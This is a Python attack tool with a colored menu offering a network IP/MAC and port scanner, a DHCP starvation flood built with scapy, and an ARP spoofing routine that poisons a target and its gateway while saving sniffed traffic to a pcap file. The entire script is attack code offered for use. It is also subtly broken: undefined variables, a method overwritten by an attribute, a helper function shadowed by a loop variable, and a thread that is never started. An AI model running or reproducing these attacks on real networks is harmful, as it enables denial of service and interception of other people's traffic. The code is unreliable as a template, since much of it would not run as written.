#Coded By Elf
from os import system
from getmac import *
from netaddr import *
from scapy.all import *
from threading import Thread
import sys , time
from colorama import Fore as C
def p(text):
    for i in text:
        print(i , end='' , flush=True)
        time.sleep(0.3)
class Mac:
    def __init__(self , ip_1 , ip_2):
        self.ip1 = ip_1
        self.ip2 = ip_2
        self.list_ip = []
    def Create_Range_Ip(self):
        create_ = [self.list_ip.append(str(IPAddress(i))) for i in range(int(IPAddress(self.ip1)) , int(IPAddress(self.ip2))+1)]
        p(f'{C.GREEN}Created All Ranges Ips..!')
        time.sleep(3)

    def Get_Mac_Addres(self):
        p(f"{C.GREEN}Get Mac All Systems..! ")
        self.Mac_List = [get_mac_address(i) for i in self.list_ip]
    
    def Ports(self):
        self.list_port = []
        p(f"{C.GREEN}Run Port Scanner..!")
        try:
            target = socket.gethostbyname(self.ip1)
            for p in range(1,80):
                sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                data = sockets.connect_ex((target,port))
                p(f"{C.YELLOW}Checking..!")
                if data == 0:
                    self.list_port.append(p)
                sockets.close()
                system('cls')
        except:
            pass
    def Print(self):
        for ip , mac in self.list_ip ,  self.Mac_List:
            p(f"{C.GREEN}IP TARGET\t\t\t{C.GREEN}MAC ADDRESS TARGET\n{C.YELLOW}{ip}\t\t\t{mac}{C.WHITE}"+"-"*7 +"\t\t"+"-"*7+'\n')    
            for port in self.list_port:
                if port:
                    p(f"{C.LIGHTGREEN_EX}PORT\t\t{C.GREEN}{port}{C.LIGHTGREEN_EX}/tcp")
                else:
                    pass
class dhcp:
    def __init__(self , Number , inface):
        self.num_ = Number
        self.Ifas = inface
    def Attack(self):
        dhcp_request = Ether(src=get_if_hwaddr(self.Ifas),dst="ff:ff:ff:ff:ff:ff")\
                            /IP(src="0.0.0.0",dst="255.255.255.255")\
                            /UDP(sport=68,dport=67)\
                            /BOOTP(chaddr=[mac2str(RandMAC())],
                                        xid=random.randint(1, 900000000),
                                        flags=0xFFFFFF)\
                            /DHCP(options=[("message-type", "discover"),("max_dhcp_size",1500),("client_id", mac2str(RandMAC())),("lease_time",10000),("end",bytes('00000000000000', encoding='ascii'))])
            
        for i in range(self.num_*10000):
            sendp(dhcp_request,iface=self.Ifas , loop=0) 
class Arp:
    def __init__(self , ip_target , ip_spoof ):
        self.target = ip
        self.spoof = ip_spoof
    def get_mac(target):
        An_l = srp(Ether(dst ="ff:ff:ff:ff:ff:ff") / ARP(pdst = str(target)), timeout = 5, verbose = False)[0]
        return An_l[0][1].hwsrc

    def spoof(self):
        pack = ARP(op = 2, pdst = self.target, hwdst = Arp.get_mac(self.target),psrc = self.spoof)
        send(pack, verbose = False)
        
    def restore(self):
        try:
            pack = ARP(op = 2, pdst = self.target, hwdst = Arp.get_mac(self.target), psrc = self.spoof, hwsrc =  Arp.get_mac(self.spoof))
            send(pack, verbose = False)
        except:
            pass
    def sniffer(count):
        data = sniff(count=int(count))
        wrpcap('sniff.pcap', data)
        
if __name__ == "__main__":
    print(f"""
{C.RED}!{C.WHITE}){C.GREEN} Coded By @E_L_F_6_6_6
{C.CYAN}#{C.WHITE}){C.GREEN} Python V3
{C.YELLOW}+-----------------------+
{C.LIGHTBLUE_EX}1{C.RESET}){C.LIGHTMAGENTA_EX} Scanner NetWork
{C.LIGHTBLUE_EX}2{C.RESET}){C.LIGHTMAGENTA_EX} DHCP Attack
{C.LIGHTBLUE_EX}3{C.RESET}){C.LIGHTMAGENTA_EX} Arp Spoofing
    """)
    num = input(f'{C.MAGENTA}Enter The Number {C.YELLOW}-->{C.GREEN} ')
    if num == '1':
        system('clear')
        ip = input(f"{C.MAGENTA}Enter The Range Ip {C.YELLOW}[192.168.1.1 , 192.168.1.255] -->{C.GREEN}  ")
        mac = Mac(ip.split(",")[0].replace(' ', ''), ip.split(",")[1].replace(' ', ''))
        mac.Create_Range_Ip()
        mac.Ports()
        mac.Get_Mac_Addres()
        mac.Print()
    elif num == '2':
        system('clear')
        inface = input(f"{C.MAGENTA}Enter The Name interface{C.YELLOW} --> ")
        Dhcp = dhcp(int(input(f'{C.MAGENTA}Enter The Count Packet [1 == 10k Packet] {C.YELLOW}--> ') ) , inface)
        Dhcp.Attack()
    elif num == '3':
        system('clear')
        target_ip = input(f'{C.MAGENTA}Enter The Ip Target {C.YELLOW}--> ')
        gateway_ip = input(f"{C.MAGENTA}Enter The Gateway Ip {C.YELLOW}--> ")
        count_packet = input(f"{C.MAGENTA}Enter The Count Packet For Saveing {C.YELLOW}--> ")
        arp = Arp(target_ip, gateway_ip)
        count = 0
        try:
            Thread(target=Arp.sniffer(count_packet))
            while True:
                try:
                    arp_1 = Arp(target_ip, gateway_ip)
                    arp_1.spoof()
                    p(f"{C.CYAN}[{count+1}]{C.GREEN}Packet Was Sent -->{C.YELLOW} {target_ip}")
                    arp_2 = Arp(gateway_ip,target_ip)
                    arp_2.spoof()
                    p(f"{C.CYAN}[{count+1}]{C.GREEN}Packet Was Sent -->{C.YELLOW} {gateway_ip}")
                except:
                    p(f"{C.RED}Error")
                    sys.exit()
        except:
            arp.restore()
            p(f"{C.RED}Error Arp Spoofing Stoped..!")